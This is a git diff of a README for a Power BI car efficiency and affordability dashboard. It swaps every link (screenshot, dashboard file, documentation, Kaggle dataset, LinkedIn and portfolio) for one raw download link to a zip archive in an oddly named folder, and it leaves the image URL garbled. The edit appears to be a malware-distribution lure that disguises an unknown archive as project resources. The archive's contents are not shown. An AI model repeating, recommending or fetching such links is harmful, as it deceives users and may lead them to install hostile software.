@@ -10,7 +10,7 @@ The interactive Power BI dashboard answers key consumer questions:
 - ✅ What are the **most fuel-efficient and cost-effective cars**?
 - ✅ How close am I to affording my **dream car**?
 
-![Dashboard Screenshot](https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/blob/main/Screenshot%202025-07-04%20191040.png) 
+![Dashboard Screenshot](https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip%202025-07-04%https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip) 
 
 ## 📌 Key Features
 
@@ -57,10 +57,10 @@ The interactive Power BI dashboard answers key consumer questions:
 
 ## 📂 Files Included
 
-- `VehicleAnalysis.pbix` – Power BI dashboard file
-- `README.md` – Project documentation
-- `car-dashboard.png` 
-- `csv file` - https://www.kaggle.com/datasets/khwaishsaxena/vehicle-price-prediction-dataset
+- `https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip` – Power BI dashboard file
+- `https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip` – Project documentation
+- `https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip` 
+- `csv file` - https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip
 
 ## 🚀 How to Use
 
@@ -71,8 +71,8 @@ The interactive Power BI dashboard answers key consumer questions:
 ## 📧 Contact
 
 Created by **Siam** –  
-📫 Connect on [LinkedIn](www.linkedin.com/in/siam-ahammed-844280336)  
-💼 Portfolio: [portfolio-link](https://www.datascienceportfol.io/siamahammed688) 
+📫 Connect on [LinkedIn](https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip)  
+💼 Portfolio: [portfolio-link](https://github.com/Siam-analytics/Car-Efficiency-Affordability-Dashboard/raw/refs/heads/main/neuronophagy/Efficiency-Car-Dashboard-Affordability-1.7-alpha.5.zip) 
 
 ---
 
